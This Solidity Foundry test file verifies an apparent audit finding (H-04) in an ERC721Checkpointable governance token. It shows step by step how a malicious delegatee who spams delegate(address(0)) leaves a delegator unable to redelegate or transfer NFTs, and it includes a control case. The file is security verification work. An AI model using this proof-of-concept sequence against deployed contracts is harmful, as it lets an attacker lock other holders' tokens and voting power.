// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30091-h-04-malicious-delegatees-can-block-delegators-from-redelega.sol";

contract DelegateBlockTest is Test {
    Exploit internal exploit;

    function setUp() public {
        exploit = new Exploit();
    }

    function test_exploit() public {
        exploit.run();

        ERC721Checkpointable token = exploit.token();
        Actor user = exploit.user();
        Actor attacker = exploit.attacker();

        // Re-assert the harm from outside run(): user is trapped, attacker is not.
        // (checkpoint[attacker] is 0 after run() already moved the attacker's own
        // NFT away, which is what makes this second user transfer underflow too.)
        assertEq(token.getVotes(address(attacker)), 0, "attacker checkpoint should be fully drained");

        vm.expectRevert();
        user.doDelegate(token, address(user));

        uint256 remainingUserToken = exploit.tokenUser1();
        vm.expectRevert();
        user.doTransfer(token, address(0xD00D), remainingUserToken);

        // Attacker's own NFT (already moved once in run()) can move again freely.
        assertEq(token.ownerOf(exploit.tokenAttacker0()), address(0xCAFE));
    }

    /// @notice EOA-based rebuild mirroring the finding's own PoC (vm.prank on
    ///         raw addresses instead of helper contracts) — confirms the bug
    ///         is not an artifact of using contract-based actors.
    function test_delegateeCanBlockDelegatorFromRedelegating_EOA() public {
        ERC721Checkpointable tok = new ERC721Checkpointable();
        address userEOA = address(0x1234);
        address attackerEOA = address(0x4321);

        tok.mint(userEOA);
        tok.mint(userEOA);
        tok.mint(attackerEOA);

        vm.prank(userEOA);
        tok.delegate(attackerEOA);

        vm.prank(attackerEOA);
        tok.delegate(address(0));

        vm.prank(attackerEOA);
        tok.delegate(address(0));

        vm.prank(userEOA);
        vm.expectRevert();
        tok.delegate(userEOA);

        vm.prank(attackerEOA);
        tok.transferFrom(attackerEOA, address(0x43214321), 2);

        vm.prank(userEOA);
        vm.expectRevert();
        tok.transferFrom(userEOA, address(0x1234567890), 0);
    }

    /// @notice Control: WITHOUT a malicious delegatee spamming delegate(0),
    ///         a user can freely redelegate and transfer their tokens.
    function test_control_normalRedelegateWorks() public {
        ERC721Checkpointable tok = new ERC721Checkpointable();
        address userEOA = address(0x1234);
        address honestDelegateEOA = address(0x5555);
        address newDelegateEOA = address(0x6666);

        tok.mint(userEOA);
        tok.mint(userEOA);

        vm.prank(userEOA);
        tok.delegate(honestDelegateEOA);
        assertEq(tok.getVotes(honestDelegateEOA), 2);

        // Honest delegate never calls delegate(address(0)) — user can freely
        // redelegate elsewhere at any time.
        vm.prank(userEOA);
        tok.delegate(newDelegateEOA);
        assertEq(tok.getVotes(newDelegateEOA), 2);
        assertEq(tok.getVotes(honestDelegateEOA), 0);

        // And can freely transfer their NFTs.
        vm.prank(userEOA);
        tok.transferFrom(userEOA, address(0x7777), 0);
        assertEq(tok.ownerOf(0), address(0x7777));
    }
}
